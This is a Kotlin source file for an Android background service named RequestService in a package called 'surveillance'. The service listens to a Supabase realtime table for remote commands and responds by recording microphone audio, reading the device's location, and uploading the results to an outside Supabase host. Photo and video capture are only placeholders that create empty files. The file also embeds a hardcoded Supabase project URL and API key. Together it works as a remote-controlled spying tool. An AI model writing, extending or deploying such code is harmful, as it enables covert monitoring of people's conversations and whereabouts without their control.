package com.system.surveillance

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Environment
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.auth.Auth
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.postgresChanges
import io.github.jan.supabase.storage.Storage
import io.github.jan.supabase.storage.storage
import io.github.jan.supabase.storage.upload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class RequestService : Service() {

    private lateinit var supabaseClient: SupabaseClient
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, NotificationCompat.Builder(this, "surveillance_channel")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Surveillance Service")
            .setContentText("Running in background")
            .build())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        // Initialize Supabase with your URL and token
        supabaseClient = createSupabaseClient(
             supabaseUrl = "https://ubixfkksdpzmiixynvqq.supabase.co",
            supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InViaXhma2tzZHB6bWlpeHludnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY1NDE3NTUsImV4cCI6MjA2MjExNzc1NX0.yT7aGQvAsYvb9qB2ZiEeK8edeXzs47d0eY94VdfWylc"  // Replace with your Supabase API key
        ) {
            install(Auth)
            install(Postgrest)
            install(Storage)
            install(Realtime)
        }

        // Subscribe to requests table changes
        CoroutineScope(Dispatchers.IO).launch {
            val channel = supabaseClient.channel("requests")
            channel.postgresChanges(
                event = "INSERT",
                schema = "public",
                table = "requests"
            ) { change ->
                val payload = change.record.jsonObject
                val action = payload["action"]?.toString()?.replace("\"", "") ?: ""
                val duration = payload["duration"]?.toString()?.toIntOrNull()
                val request = Request(action, duration)
                handleRequest(request)
            }
            channel.subscribe()
        }
    }

    private fun handleRequest(request: Request) {
        when (request.action) {
            "capture_photo" -> capturePhoto()
            "record_video" -> recordVideo(request.duration ?: 30)
            "record_audio" -> recordAudio(request.duration ?: 60)
            "get_location" -> getLocationAndSendToPanel()
        }
    }

    private fun capturePhoto() {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        val photoFile = File(storageDir, "Photo_$timestamp.jpg")
        photoFile.createNewFile() // Placeholder file
        uploadFileToSupabase(photoFile, "photos")
    }

    private fun recordVideo(duration: Int) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val storageDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)
        val videoFile = File(storageDir, "Video_$timestamp.mp4")
        videoFile.createNewFile() // Placeholder file
        uploadFileToSupabase(videoFile, "videos")
    }

    private fun recordAudio(duration: Int) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val storageDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        recordingFile = File(storageDir, "Audio_$timestamp.mp3")

        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(recordingFile?.absolutePath)
            setMaxDuration(duration * 1000)
            setOnInfoListener { _, what, _ ->
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    stopRecording()
                }
            }
            prepare()
            start()
        }
    }

    private fun stopRecording() {
        mediaRecorder?.apply {
            stop()
            release()
        }
        mediaRecorder = null
        recordingFile?.let { uploadFileToSupabase(it, "audios") }
    }

    private fun getLocationAndSendToPanel() {
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                location?.let {
                    val locationData = mapOf(
                        "device_id" to "12345",
                        "latitude" to it.latitude,
                        "longitude" to it.longitude,
                        "timestamp" to System.currentTimeMillis()
                    )
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            supabaseClient.from("locations").insert(locationData)
                        } catch (e: Exception) {
                            println("Error sending location: $e")
                        }
                    }
                }
            }
        }
    }

    private fun uploadFileToSupabase(file: File, bucketName: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                supabaseClient.storage.from(bucketName).upload(file.name, file.readBytes()) {
                    upsert = true
                }
            } catch (e: Exception) {
                println("Error uploading file to $bucketName: $e")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        if (mediaRecorder != null) stopRecording()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "surveillance_channel",
            "Surveillance Service",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }
}

@Serializable
data class Request(
    val action: String,
    val duration: Int? = null
)